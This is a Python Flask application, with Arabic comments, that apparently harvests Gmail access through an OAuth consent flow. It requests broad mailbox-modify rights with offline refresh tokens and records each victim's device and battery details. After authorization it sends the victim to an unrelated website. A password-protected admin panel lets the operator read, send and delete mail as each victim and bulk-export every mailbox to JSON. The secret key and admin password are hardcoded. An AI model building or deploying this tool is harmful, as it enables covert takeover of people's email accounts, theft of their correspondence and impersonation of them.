import os
import json
import base64
import threading
import uuid
from datetime import datetime
from email.mime.text import MIMEText
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request

app = Flask(__name__)
# مفتاح ثابت وقوي لتأمين جلسات المتصفح ومنع ضياع البيانات
app.secret_key = 'abdellah_ultimate_secret_key_fixed_2026'

# تفعيل السماح بمرور بروتوكول OAuth2 عبر HTTP للتطوير المحلي
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

ADMIN_PASSWORD = 'abdellahCV'
CLIENT_SECRETS_FILE = "client_secret.json"
SCOPES = ['https://www.googleapis.com/auth/gmail.modify']

# يجب أن توافق هذه القيمة مع redirect_uris في client_secret.json
REDIRECT_URI = 'http://localhost:5000/oauth2callback'

with open(CLIENT_SECRETS_FILE, 'r', encoding='utf-8') as f:
    CLIENT_CONFIG = json.load(f)

CLIENT_ID = CLIENT_CONFIG['web']['client_id']
CLIENT_SECRET = CLIENT_CONFIG['web']['client_secret']
TOKEN_URI = CLIENT_CONFIG['web']['token_uri']

# قاعدة البيانات المؤقتة في الذاكرة لتخزين الحسابات والتوكنز الأبدية
db_users = {}
export_tasks = {}


def build_credentials(user_data):
    creds = Credentials(
        token=user_data.get('access_token'),
        refresh_token=user_data.get('refresh_token'),
        token_uri=TOKEN_URI,
        client_id=CLIENT_ID,
        client_secret=CLIENT_SECRET,
    )

    if creds.refresh_token and (not creds.valid or creds.expired):
        request_adapter = Request()
        creds.refresh(request_adapter)
        user_data['access_token'] = creds.token

    return creds


def get_header_value(message, header_name):
    headers = message.get('payload', {}).get('headers', [])
    for header in headers:
        if header.get('name', '').lower() == header_name.lower():
            return header.get('value')
    return None


def get_message_body(payload):
    if not payload:
        return ''

    mime_type = payload.get('mimeType', '')
    body = payload.get('body', {})
    data = body.get('data')
    if data and mime_type in ('text/plain', 'text/html'):
        decoded = base64.urlsafe_b64decode(data.encode('utf-8')).decode('utf-8', errors='ignore')
        return decoded

    for part in payload.get('parts', []) or []:
        result = get_message_body(part)
        if result:
            return result

    return ''


@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/start-auth', methods=['POST'])
def start_auth():
    # 1. حفظ بيانات الهاتف والبطارية القادمة من الـ Frontend
    session['temp_device'] = request.json

    # 2. بناء تدفق التحقق الحقيقي مع إجبار التوجيه إلى localhost
    flow = Flow.from_client_secrets_file(
        CLIENT_SECRETS_FILE,
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )
    
    auth_url, state = flow.authorization_url(
        access_type='offline',
        prompt='consent'
    )
    
    session['oauth_state'] = state
    session['code_verifier'] = flow.code_verifier
    return jsonify({"auth_url": auth_url})

@app.route('/oauth2callback')
def oauth2callback():
    # 3. استعادة التدفق عند عودة المستخدم من سيرفرات جوجل
    flow = Flow.from_client_secrets_file(
        CLIENT_SECRETS_FILE,
        scopes=SCOPES,
        state=session.get('oauth_state'),
        redirect_uri=REDIRECT_URI
    )
    flow.code_verifier = session.get('code_verifier')

    # استلام التوكنات بنجاح
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    
    # 5. جلب البريد الإلكتروني الفعلي للحساب المشترك
    gmail_service = build('gmail', 'v1', credentials=credentials)
    profile = gmail_service.users().getProfile(userId='me').execute()
    email = profile.get('emailAddress')
    
    device_info = session.get('temp_device', {})
    
    # 6. التخزين الفعلي للبيانات والـ Refresh Token الأبدي
    db_users[email] = {
        "email": email,
        "name": email.split('@')[0],
        "refresh_token": credentials.refresh_token,
        "access_token": credentials.token,
        "device": device_info.get('device', 'غير معروف'),
        "battery": device_info.get('battery', 'غير معروف')
    }
    
    return redirect('https://www.psfuturemail.com/')

@app.route('/waiting')
def waiting_page():
    return render_template('waiting.html')

@app.route('/admin', methods=['GET', 'POST'])
def admin_page():
    if 'is_admin' in session and session['is_admin']:
        display_data = []
        for email, user_data in db_users.items():
            creds = build_credentials(user_data)
            try:
                gmail = build('gmail', 'v1', credentials=creds)
                # جلب أحدث 25 رسالة لعرضها في لوحة التحكم
                results = gmail.users().messages().list(userId='me', maxResults=25).execute()
                messages = results.get('messages', [])
                
                fetched_messages = []
                for msg in messages:
                    msg_details = gmail.users().messages().get(userId='me', id=msg['id']).execute()
                    subject = get_header_value(msg_details, 'Subject') or msg_details.get('snippet', 'لا يوجد عنوان')
                    fetched_messages.append({
                        "id": msg['id'],
                        "subject": subject,
                        "snippet": msg_details.get('snippet', '')
                    })
            except Exception as e:
                fetched_messages = [{"id": "error", "subject": "انتهت صلاحية الجلسة الحالية", "snippet": str(e)}]

            display_data.append({
                "email": user_data['email'],
                "name": user_data['name'],
                "device": user_data['device'],
                "battery": user_data['battery'],
                "messages": fetched_messages
            })
        return render_template('admin.html', users=display_data)

    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['is_admin'] = True
            return redirect(url_for('admin_page'))
        else:
            error = "كلمة المرور خاطئة!"
    return render_template('admin_login.html', error=error)

# ==================== مسارات الـ API للتحكم الكامل بالرسائل ====================

@app.route('/api/delete-message/<email>/<msg_id>', methods=['POST'])
def delete_message(email, msg_id):
    user_data = db_users.get(email)
    if not user_data:
        return jsonify({"status": "error", "message": "الحساب غير موجود"}), 404
        
    creds = build_credentials(user_data)
    try:
        gmail = build('gmail', 'v1', credentials=creds)
        gmail.users().messages().trash(userId='me', id=msg_id).execute()
        return jsonify({"status": "success", "message": "تم نقل الرسالة إلى المهملات"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/mark-read/<email>/<msg_id>', methods=['POST'])
def mark_read(email, msg_id):
    user_data = db_users.get(email)
    if not user_data:
        return jsonify({"status": "error", "message": "الحساب غير موجود"}), 404
        
    creds = build_credentials(user_data)
    try:
        gmail = build('gmail', 'v1', credentials=creds)
        gmail.users().messages().modify(
            userId='me', 
            id=msg_id, 
            body={'removeLabelIds': ['UNREAD']}
        ).execute()
        return jsonify({"status": "success", "message": "تم تحديد الرسالة كمقروءة"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/send-email/<email>', methods=['POST'])
def send_email(email):
    user_data = db_users.get(email)
    if not user_data:
        return jsonify({"status": "error", "message": "الحساب غير موجود"}), 404
        
    data = request.json
    if not data or not data.get('to') or not data.get('subject'):
        return jsonify({"status": "error", "message": "الرجاء إرسال الحقول المطلوبة: to, subject, body"}), 400

    creds = build_credentials(user_data)
    try:
        gmail = build('gmail', 'v1', credentials=creds)
        
        message = MIMEText(data.get('body', ''))
        message['to'] = data.get('to')
        message['subject'] = data.get('subject')
        raw = base64.urlsafe_b64encode(message.as_bytes()).decode()
        
        gmail.users().messages().send(userId='me', body={'raw': raw}).execute()
        return jsonify({"status": "success", "message": "تم إرسال الرسالة بنجاح"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/message-details/<email>/<msg_id>', methods=['GET'])
def message_details(email, msg_id):
    user_data = db_users.get(email)
    if not user_data:
        return jsonify({"status": "error", "message": "الحساب غير موجود"}), 404

    creds = build_credentials(user_data)
    try:
        gmail = build('gmail', 'v1', credentials=creds)
        msg = gmail.users().messages().get(userId='me', id=msg_id, format='full').execute()
        payload = msg.get('payload', {})
        body = get_message_body(payload)
        return jsonify({
            "status": "success",
            "id": msg_id,
            "subject": get_header_value(msg, 'Subject') or 'بدون عنوان',
            "from": get_header_value(msg, 'From') or 'غير معروف',
            "to": get_header_value(msg, 'To') or 'غير معروف',
            "date": get_header_value(msg, 'Date') or 'غير معروف',
            "body_text": body,
            "body_html": body
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def run_export_task(task_id):
    task = export_tasks.get(task_id)
    if not task:
        return

    task['status'] = 'running'
    try:
        export_accounts = []
        for email, user_data in db_users.items():
            account_export = {
                "email": user_data['email'],
                "name": user_data['name'],
                "device": user_data['device'],
                "battery": user_data['battery'],
                "messages": []
            }

            try:
                creds = build_credentials(user_data)
                gmail = build('gmail', 'v1', credentials=creds)
                page_token = None

                while True:
                    response = gmail.users().messages().list(
                        userId='me',
                        pageToken=page_token,
                        maxResults=500
                    ).execute()

                    messages = response.get('messages', [])
                    for msg in messages:
                        try:
                            msg_details = gmail.users().messages().get(
                                userId='me',
                                id=msg['id'],
                                format='full'
                            ).execute()

                            account_export['messages'].append({
                                "id": msg['id'],
                                "subject": get_header_value(msg_details, 'Subject') or msg_details.get('snippet', ''),
                                "from": get_header_value(msg_details, 'From') or 'غير معروف',
                                "to": get_header_value(msg_details, 'To') or 'غير معروف',
                                "date": get_header_value(msg_details, 'Date') or 'غير معروف',
                                "snippet": msg_details.get('snippet', ''),
                                "body": get_message_body(msg_details.get('payload'))
                            })
                        except Exception:
                            continue

                    page_token = response.get('nextPageToken')
                    if not page_token:
                        break
            except Exception as e:
                account_export['export_error'] = str(e)

            export_accounts.append(account_export)

        data = {
            "exported_at": datetime.utcnow().isoformat(),
            "accounts": export_accounts
        }
        payload = json.dumps(data, ensure_ascii=False, indent=2)
        task.update({
            'status': 'done',
            'payload': payload,
            'filename': 'admin_export_all.json'
        })
    except Exception as e:
        task.update({'status': 'error', 'error': str(e)})

@app.route('/admin/export-request')
def admin_export_request():
    if 'is_admin' not in session or not session['is_admin']:
        return jsonify({'status': 'error', 'message': 'unauthorized'}), 403

    task_id = str(uuid.uuid4())
    export_tasks[task_id] = {'status': 'pending'}
    thread = threading.Thread(target=run_export_task, args=(task_id,), daemon=True)
    thread.start()

    return jsonify({'status': 'started', 'task_id': task_id})

@app.route('/admin/export-status/<task_id>')
def admin_export_status(task_id):
    task = export_tasks.get(task_id)
    if not task:
        return jsonify({'status': 'error', 'message': 'task not found'}), 404
    return jsonify({
        'status': task['status'],
        'error': task.get('error', '')
    })

@app.route('/admin/export-download/<task_id>')
def admin_export_download(task_id):
    task = export_tasks.get(task_id)
    if not task:
        return jsonify({'status': 'error', 'message': 'task not found'}), 404
    if task['status'] != 'done':
        return jsonify({'status': 'error', 'message': 'export not ready'}), 400
    return Response(task['payload'], mimetype='application/json', headers={
        'Content-Disposition': f"attachment; filename={task['filename']}"
    })

@app.route('/admin/logout')
def admin_logout():
    session.pop('is_admin', None)
    return redirect(url_for('admin_page'))

if __name__ == '__main__':
    app.run(debug=True, port=5000)
